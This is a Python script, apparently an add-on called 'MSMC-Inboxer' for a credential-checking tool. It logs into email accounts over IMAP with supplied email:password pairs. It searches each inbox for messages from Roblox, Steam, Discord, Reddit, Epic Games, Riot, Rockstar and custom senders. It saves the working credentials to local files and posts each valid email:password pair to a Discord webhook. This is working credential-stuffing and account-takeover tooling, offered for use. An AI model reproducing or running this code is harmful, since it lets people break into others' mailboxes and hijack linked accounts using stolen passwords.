import imaplib, requests, json, os, re
from email.utils import parsedate_to_datetime
from datetime import datetime

with open('addons/Inbox/config.json', 'r') as config_file:
    config = json.load(config_file)

with open('addons/Inbox/custom_checks.json', 'r') as custom_file:
    custom_checks = json.load(custom_file)

# Default Checks
check_roblox = config["default_checks"]["roblox"]
check_steam = config["default_checks"]["steam"]
check_discord = config["default_checks"]["discord"]
check_reddit = config["default_checks"]["reddit"]
check_epicgames = config["default_checks"]["epicgames"]
check_riot = config["default_checks"]["riotgames"]
check_rockstar = config["default_checks"]["rockstargames"]

discord_webhook = config["discord_webhook"]

def parsedate(date_str):
    date_regex = re.compile(r'Date: (\w{3}), (\d{2}) (\w{3}) (\d{4}) (\d{2}):(\d{2}):(\d{2}) \+0000 \(UTC\)')
    match = date_regex.match(date_str)
    if match:
        day_name, day, month, year, hour, minute, second = match.groups()
        month = datetime.strptime(month, '%b').month
        return datetime(int(year), month, int(day), int(hour), int(minute), int(second))

def inboxmail(email, password):
    # Setup IMAP
    email_parts = email.split('@')
    domain = email_parts[-1]
    
    outlook_domains = ["hotmail.com", "outlook.com", "hotmail.fr", "outlook.fr", "live.com", "live.fr"]
    
    if domain in outlook_domains:
        imap_servers = ['outlook.office365.com']
    else:
        imap_servers = [f'imap.{domain}']
    for imap_server in imap_servers:
        try:
            imap = imaplib.IMAP4_SSL(imap_server, timeout=30)
        except Exception as e:
            print(f"Failed to connect to IMAP server {imap_server}: {e}")
            continue
        try:
            imap.login(email, password)
            status, messages = imap.select("inbox")
            if status == "OK":
                # Check for Emails
                counts = {}
                discord_year = None
                reddit_year = None
                if check_roblox:
                    result, accounts_data = imap.uid("search", None, f'(FROM "accounts@roblox.com")')
                    result, noreply_data = imap.uid("search", None, f'(FROM "no-reply@roblox.com")')
                    if result == "OK":
                        counts['Roblox'] = len(accounts_data[0].split()) + len(noreply_data[0].split())
                if check_steam:
                    result, data = imap.uid("search", None, f'(FROM "noreply@steampowered.com")')
                    if result == "OK":
                        counts['Steam'] = len(data[0].split())
                if check_discord:
                    result, data = imap.uid("search", None, f'(FROM "noreply@discord.com")')
                    if result == "OK":
                        discord_uids = data[0].split()
                        counts['Discord'] = len(discord_uids)
                        if discord_uids:
                            result, data = imap.uid("fetch", discord_uids[0], "(BODY[HEADER.FIELDS (DATE)])")
                            if result == "OK":
                                date_str = data[0][1].decode().strip()
                                email_date = parsedate(date_str)
                                discord_year = email_date.year
                if check_reddit:
                    result, main_data = imap.uid("search", None, f'(FROM "noreply@reddit.com")')
                    result, mail_data = imap.uid("search", None, f'(FROM "noreply@redditmail.com")')
                    if result == "OK":
                        main_uids = main_data[0].split()
                        mail_uids = mail_data[0].split()
                        counts['Reddit'] = len(main_uids + mail_uids)
                        if mail_uids:
                            result, data = imap.uid("fetch", mail_uids[0], "(BODY[HEADER.FIELDS (DATE)])")
                            if result == "OK":
                                date_str = data[0][1].decode().strip()
                                email_date = parsedate(date_str)
                                reddit_year = email_date.year
                        
                        elif main_uids:
                            result, data = imap.uid("fetch", main_uids[0], "(BODY[HEADER.FIELDS (DATE)])")
                            if result == "OK":
                                date_str = data[0][1].decode().strip()
                                email_date = parsedate(date_str)
                                reddit_year = email_date.year
                if check_epicgames:
                    result, data = imap.uid("search", None, f'(FROM "help@accts.epicgames.com")')
                    if result == "OK":
                        counts['Epic Games'] = len(data[0].split())
                if check_riot:
                    result, data = imap.uid("search", None, f'(FROM "noreply@mail.accounts.riotgames.com")')
                    if result == "OK":
                        counts['Riot'] = len(data[0].split())
                if check_rockstar:
                    result, data = imap.uid("search", None, f'(FROM "noreply@rockstargames.com")')
                    if result == "OK":
                        counts['Rockstar'] = len(data[0].split())
                
                # Custom Checks
                for check_name, check_info in custom_checks.items():
                    if check_name.lower() == "example_check":
                        continue
                    result, data = imap.uid("search", None, f'(FROM "{check_info["email"]}")')
                    if result == "OK":
                        counts[check_name] = len(data[0].split())
                
                if not os.path.exists('Valid Mails'):
                    os.makedirs('Valid Mails')
                
                for service, count in counts.items():
                    if count > 0:
                        with open(f'Valid Mails/{service}.txt', 'a') as file:
                            file.write(f'{email}:{password} | {count} hits\n')

        except Exception as e:
            print(f"Failed to login or fetch emails: {e}")
            continue
        # Discord Webhook
        if any(count > 0 for count in counts.values()):
            embed = {
                "title": "Valid Mail",
                "description": f"{email}:{password}",
                "color": 0x00f556,
                "fields": [],
                "footer": {
                    "text": ".gg/PGer • MSMC-Inboxer"
                }
            }
            
            for service, count in counts.items():
                if count > 0:
                    if service == 'Reddit' and reddit_year:
                        embed["fields"].append({
                            "name": service,
                            "value": f"``{count} Hits (Estimated Year: {reddit_year})``",
                            "inline": True
                        })
                    elif service == 'Discord' and discord_year:
                        embed["fields"].append({
                            "name": service,
                            "value": f"``{count} Hits (Estimated Year: {discord_year})``",
                            "inline": True
                        })
                    else:
                        embed["fields"].append({
                            "name": service,
                            "value": f"``{count} Hits``",
                            "inline": True
                        })

            try:
                response = requests.post(discord_webhook, json={"embeds": [embed]})
                if response.status_code != 204:
                    print(f"Failed to send webhook, status code: {response.status_code}, response: {response.text}")
            except Exception as e:
                print(f"Failed to send webhook: {e}")
